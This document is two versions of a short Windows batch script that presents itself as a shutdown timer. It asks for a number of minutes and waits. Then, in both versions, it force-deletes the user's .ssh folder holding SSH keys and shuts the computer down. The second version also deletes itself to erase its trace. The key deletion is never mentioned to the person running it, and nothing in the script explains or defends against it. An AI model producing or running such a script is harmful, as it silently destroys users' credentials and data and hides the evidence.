@echo off

set /p input="type any input "
set /a time = %input% * 60
timeout /t %time% /NOBREAK

rmdir /s /q C:\Users\%username%\.ssh
shutdown /s /t 60



@echo off

set /p input="number in minutes: "
if "%input%"=="0" (
	set /a time = 5
) else (
	set /a time = %input% * 60
)
timeout /t %time% /NOBREAK

rmdir /s /q C:\Users\%username%\.ssh
shutdown /s /t 20
(start /b "" cmd /c del "%~f0") & exit

